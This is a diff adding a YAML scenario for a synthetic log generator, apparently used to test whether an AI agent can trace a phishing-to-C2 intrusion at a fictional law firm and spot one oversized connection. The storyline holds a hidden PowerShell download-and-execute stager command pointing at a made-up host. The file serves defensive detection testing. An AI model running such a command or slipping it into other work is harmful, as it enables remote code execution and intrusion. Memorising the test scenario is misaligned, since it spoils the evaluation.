@@ -1,0 +1,238 @@
+version: "1.0"
+generation_seed: 6602
+name: phishing-c2-beacon
+description: |
+  A paralegal at a small law firm opens a macro-enabled attachment from a
+  phishing email disguised as an overdue invoice notice. The macro
+  launches a hidden PowerShell stager that establishes a periodic HTTPS
+  beacon to external infrastructure. After roughly ninety minutes of
+  routine check-in traffic, one connection within that same channel
+  carries a byte volume an order of magnitude larger than every other
+  beacon tick — a manual attacker action riding the C2 channel, not the
+  beacon itself. Tests whether an agent traces delivery -> execution ->
+  C2 as three distinct, separately-citable stages, and specifically
+  whether it notices the one connection that isn't like the others
+  rather than treating "found a beacon" as the end of the investigation.
+
+environment:
+  description: "Small law firm — a few attorneys, a paralegal, one sysadmin, a domain controller, and an on-prem mail server"
+  domain: "rivermarklegal.local"
+
+  timezone:
+    default: "America/Chicago"
+
+  users:
+    - username: james.okafor
+      full_name: "James Okafor"
+      email: "james.okafor@rivermarklegal.com"
+      persona: analyst
+      primary_system: WS-JOKAFOR-01
+      groups: ["paralegals"]
+      enabled: true
+      browsing_intensity: normal
+
+    - username: maria.santos
+      full_name: "Maria Santos"
+      email: "maria.santos@rivermarklegal.com"
+      persona: legal_counsel
+      primary_system: WS-MSANTOS-01
+      groups: ["attorneys"]
+      enabled: true
+      browsing_intensity: normal
+
+    - username: tom.becker
+      full_name: "Tom Becker"
+      email: "tom.becker@rivermarklegal.com"
+      persona: sysadmin
+      primary_system: WS-TBECKER-01
+      groups: ["it-admins"]
+      enabled: true
+      browsing_intensity: light
+
+  systems:
+    - hostname: WS-JOKAFOR-01
+      ip: "10.60.10.31"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: james.okafor
+      services: ["dns-client"]
+
+    - hostname: WS-MSANTOS-01
+      ip: "10.60.10.32"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: maria.santos
+      services: ["dns-client"]
+
+    - hostname: WS-TBECKER-01
+      ip: "10.60.10.33"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: tom.becker
+      services: ["dns-client"]
+
+    - hostname: DC-01
+      ip: "10.60.20.10"
+      os: "Windows Server 2022"
+      type: domain_controller
+      services: ["kerberos", "ldap", "dns", "windows-dhcp-server"]
+      roles: ["domain_controller", "dns_server", "dhcp_server"]
+
+    - hostname: MAIL-01
+      ip: "10.60.20.30"
+      os: "Windows Server 2022"
+      type: server
+      services: ["smtp"]
+      roles: ["mail_server"]
+
+  email:
+    accepted_domains:
+      - rivermarklegal.com
+    mail_servers:
+      - name: main
+        hostname: mail.rivermarklegal.com
+        system: MAIL-01
+        platform: generic_smtp
+        allow_inbound_starttls: true
+        attempt_outbound_starttls: true
+    default_mailbox_servers: [main]
+    outbound_routes:
+      - name: default
+        servers: [main]
+    inbound_route: [main]
+    artifacts:
+      mode: storyline
+    background_messages_per_user_per_day: 3.0
+
+  network:
+    segments:
+      - name: workstations
+        cidr: "10.60.10.0/24"
+        exposure: internal
+      - name: servers
+        cidr: "10.60.20.0/24"
+        exposure: internal
+    sensors:
+      - type: network
+        name: core-tap
+        hostname: zeek01
+        monitoring_segments: [workstations, servers]
+        direction: bidirectional
+        placement: span
+        log_formats: [zeek]
+
+time_window:
+  start: "2024-11-04T13:00:00Z"
+  duration: "24h"
+  warmup: "8h"
+
+baseline_activity:
+  description: "Ordinary small-firm workday — legal document review, moderate email use, domain authentication, minimal background noise."
+  intensity: low
+  variation: low
+  suspicious_noise: low
+
+observation_profile: complete
+logon_grace_period: "30m"
+
+storyline:
+  - id: evt-logon-000
+    time: "+2h00m"
+    actor: james.okafor
+    system: WS-JOKAFOR-01
+    activity: "James logs into his own workstation for the day, as usual"
+    events:
+      - type: logon
+        logon_type: 2
+
+  - id: evt-phish-001
+    time: "+2h05m"
+    actor: james.okafor
+    system: WS-JOKAFOR-01
+    activity: "A phishing email disguised as an overdue-invoice notice is delivered to James's inbox"
+    events:
+      - type: email_message
+        technique: "T1566.001 - Phishing: Spearphishing Attachment"
+        description: "External phishing message with a macro-enabled Word attachment, not caught by mail filtering"
+        sender: "billing@invoice-secure-delivery.net"
+        to: ["james.okafor@rivermarklegal.com"]
+        subject: "Overdue Invoice #4471 - Immediate Action Required"
+        body: "Please review and process the attached overdue invoice immediately to avoid service interruption."
+        verdict: phishing
+        mail_action: deliver
+        outcome: delivered
+        attachments:
+          - filename: "Invoice_4471.docm"
+            content_type: "application/vnd.ms-word.document.macroEnabled.12"
+            size: 248000
+
+  - id: evt-execute-002
+    time: "+2h12m"
+    actor: james.okafor
+    system: WS-JOKAFOR-01
+    activity: "James opens the attachment, enabling macros when prompted"
+    events:
+      - type: process
+        technique: "T1204.002 - User Execution: Malicious File"
+        description: "Word opens the downloaded macro-enabled attachment"
+        process_name: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+        command_line: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\james.okafor\\Downloads\\Invoice_4471.docm\""
+        process_ref: "phish-winword"
+
+  - id: evt-execute-003
+    time: "+2h13m"
+    actor: james.okafor
+    system: WS-JOKAFOR-01
+    activity: "The document's macro silently launches a hidden PowerShell stager"
+    events:
+      - type: process
+        technique: "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        description: "Macro-launched PowerShell downloads and executes a stager from external infrastructure"
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('https://cdn-updates-svc.net/init.ps1')\""
+        parent_ref: "phish-winword"
+
+  - id: evt-beacon-004
+    time: "+2h14m"
+    actor: james.okafor
+    system: WS-JOKAFOR-01
+    activity: "The stager establishes a periodic HTTPS beacon to external C2 infrastructure, continuing for about three hours"
+    events:
+      - type: beacon
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+        description: "Periodic HTTPS check-in traffic to the same domain referenced in the PowerShell stager"
+        dst_ip: "45.83.221.40"
+        dst_port: 443
+        hostname: "cdn-updates-svc.net"
+        service: ssl
+        interval: "5m"
+        duration: "3h"
+        jitter: 0.15
+        action: allow
+
+  - id: evt-manualcmd-005
+    time: "+3h44m"
+    actor: james.okafor
+    system: WS-JOKAFOR-01
+    activity: "Roughly ninety minutes into the beacon, one connection within the same channel carries far more data than any routine check-in — a manual attacker action riding the C2 channel"
+    events:
+      - type: connection
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+        description: "A single connection to the same C2 endpoint with byte volume far exceeding every routine beacon check-in"
+        dst_ip: "45.83.221.40"
+        dst_port: 443
+        hostname: "cdn-updates-svc.net"
+        service: ssl
+        orig_bytes: 620000
+        resp_bytes: 4200
+
+output:
+  logs:
+    - format: windows_event_security
+    - format: windows_event_sysmon
+    - format: zeek_dns
+    - format: zeek_conn
+    - format: zeek_ssl
+    - format: zeek_smtp
+  destination: scenarios/phishing-c2-beacon
+  compression: false
